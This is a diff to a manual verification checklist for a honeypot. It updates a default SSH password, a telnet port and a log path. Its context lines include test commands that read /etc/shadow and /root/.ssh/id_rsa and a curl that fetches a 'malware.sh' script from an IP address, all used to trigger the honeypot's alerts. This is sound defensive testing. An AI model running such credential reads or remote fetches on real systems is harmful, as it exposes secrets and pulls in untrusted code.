@@ -8,10 +8,10 @@ This guide provides a step-by-step checklist to manually verify every feature of
 *Goal: Ensure the honeypot is reachable and basic services respond.*
 
 1.  **SSH Login**
-    - `ssh root@<ip> -p 2222` (use password `toor`).
+    - `ssh root@<ip> -p 2222` (use password `admin`).
     - **Check**: Do you get a prompt? Does `whoami` return `root`?
 2.  **Telnet Login**
-    - `telnet <ip> 2323`.
+    - `telnet <ip> 2223`.
     - **Check**: Do you see the `/etc/issue` banner? Does login work?
 3.  **Basic Command execution**
     - Run `ls -la`, `cd /etc`, `cat /etc/passwd`.
@@ -42,7 +42,7 @@ This guide provides a step-by-step checklist to manually verify every feature of
 
 1.  **Honeytoken Tripwire**
     - Run `cat /etc/shadow` or `cat /root/.ssh/id_rsa`.
-    - **Check**: Observe the logs (`tail -f var/log/cyanide/cyanide.log`). You should see a `CRITICAL_ALERT` event.
+    - **Check**: Observe the logs (`tail -f var/log/cyanide/cyanide-fs.json`). You should see a `CRITICAL_ALERT` event.
 2.  **IoC Extraction**
     - Run `curl http://91.222.11.4/malware.sh`.
     - **Check**: Look for an `ioc_detected` event in the logs containing the IP and URL.
